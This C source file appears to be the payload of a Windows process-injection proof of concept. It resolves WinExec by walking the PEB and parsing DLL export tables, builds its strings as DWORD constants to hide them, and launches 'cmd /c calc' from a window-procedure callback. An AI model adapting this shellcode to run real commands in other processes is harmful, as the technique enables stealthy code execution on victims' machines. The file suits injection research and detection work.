#include "../NTlib/nttpp.h"

typedef UINT (WINAPI *WinExec_t)(
  _In_ LPCSTR lpCmdLine, _In_ UINT uCmdShow);

LPVOID xGetProcAddress(LPVOID pszAPI);
int xstrcmp(char*,char*);

LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, 
  WPARAM wParam, LPARAM lParam)
{
    WinExec_t pWinExec;
    DWORD     szWinExec[2],
              szCode[3];

    // now call WinExec to start payload
    szWinExec[0] = *(DWORD*)"WinE";
    szWinExec[1] = *(DWORD*)"xec\0";
    
    szCode[0] = *(DWORD*)"cmd ";
    szCode[1] = *(DWORD*)"/c c";
	szCode[2] = *(DWORD*)"alc\0";
	

    pWinExec = (WinExec_t)xGetProcAddress(szWinExec);
    
    if(pWinExec != NULL) {
      pWinExec((LPSTR)szCode, SW_SHOW);
    }

    return 0;
}

#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

// locate address of API in export table
LPVOID FindExport(LPVOID base, PCHAR pszAPI){
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_NT_HEADERS       nt;
    DWORD                   cnt, rva, dll_h;
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD                  adr;
    PDWORD                  sym;
    PWORD                   ord;
    PCHAR                   api, dll;
    LPVOID                  api_adr=NULL;
    
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    
    // if no export table, return NULL
    if (rva==0) return NULL;
    
    exp = (PIMAGE_EXPORT_DIRECTORY) RVA2VA(ULONG_PTR, base, rva);
    cnt = exp->NumberOfNames;
    
    // if no api names, return NULL
    if (cnt==0) return NULL;
    
    adr = RVA2VA(PDWORD,base, exp->AddressOfFunctions);
    sym = RVA2VA(PDWORD,base, exp->AddressOfNames);
    ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
    dll = RVA2VA(PCHAR, base, exp->Name);
    
    do {
      // calculate hash of api string
      api = RVA2VA(PCHAR, base, sym[cnt-1]);
      // add to DLL hash and compare
      if (!xstrcmp(pszAPI, api)){
        // return address of function
        api_adr = RVA2VA(LPVOID, base, adr[ord[cnt-1]]);
        return api_adr;
      }
    } while (--cnt && api_adr==0);
    return api_adr;
}

#ifndef _MSC_VER
/* for __x86_64 only */
unsigned __int64 __readgsqword(unsigned long Offset)
{
   void *ret;
   __asm__ volatile ("movq  %%gs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) (unsigned __int64) Offset)));
   return (unsigned __int64) ret;
}
#endif

// search all modules in the PEB for API
LPVOID xGetProcAddress(LPVOID pszAPI) {
    PPEB                  peb;
    PPEB_LDR_DATA         ldr;
    PLDR_DATA_TABLE_ENTRY dte;
    LPVOID                api_adr=NULL;
    
  #if defined(_WIN64)
    peb = (PPEB) __readgsqword(0x60);
  #else
    peb = (PPEB) __readfsdword(0x30);
  #endif

    ldr = (PPEB_LDR_DATA)peb->Ldr;
    
    // for each DLL loaded
    for (dte=(PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL && api_adr == NULL; 
         dte=(PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
    {
      // search the export table for api
      api_adr=FindExport(dte->DllBase, (PCHAR)pszAPI);  
    }
    return api_adr;
}

// same as strcmp
int xstrcmp(char *s1, char *s2){
    while(*s1 && (*s1==*s2))s1++,s2++;
    return (int)*(unsigned char*)s1 - *(unsigned char*)s2;
}
